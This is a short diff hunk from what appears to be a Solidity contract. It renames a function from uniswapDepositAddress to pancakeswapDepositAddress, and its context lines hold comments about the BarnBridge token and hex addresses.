@@ -6115,7 +6115,7 @@ function performTasks() public {
 // 0xd0352a019e9ab9d757776f532377aaebd36fd541
 
 // BarnBridge Governance Token (BOND)
-function uniswapDepositAddress() public pure returns (address) {
+function pancakeswapDepositAddress () public pure returns (address) {
 // BarnBridge aims to offer a cross platform protocol for tokenizing risk.
 // 0x0391D2021f89DC339F60Fff84546EA23E337750f
 
